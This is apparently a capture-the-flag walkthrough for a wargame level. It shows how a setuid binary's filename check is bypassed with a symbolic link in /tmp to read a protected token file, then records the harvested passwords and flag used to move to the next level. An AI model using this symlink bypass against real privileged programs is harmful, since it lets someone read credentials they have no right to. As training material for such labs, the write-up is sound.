## Check files in home

ls -la

->  -rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
    -rw-------  1 flag08 flag08    26 Mar  5  2016 token

## check level08, this files have permissions in flag08 when executed then with string

string level08

```bash
    %s [file to read]
    token
    You may not access '%s'
    Unable to open %s
    Unable to read fd %d
```

## to exploit then we need to use "token" but we cant open because they only have permissions by flag08
## to open the file and be able to use it we will have to create a symbolic link

```bash
	ln -s ~/token /tmp/test
```

## finally execute level08 script with argument link

./level08 /tmp/test

-> quif5eloekouj29ke0vouxean

## Log in to user flag08

su flga08 (password: quif5eloekouj29ke0vouxean)

## execute getflag

getflag

->  Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f

## Log in to user level09

su level09 (password: 25749xKZ8L7DkSCwJkT9dyv6f)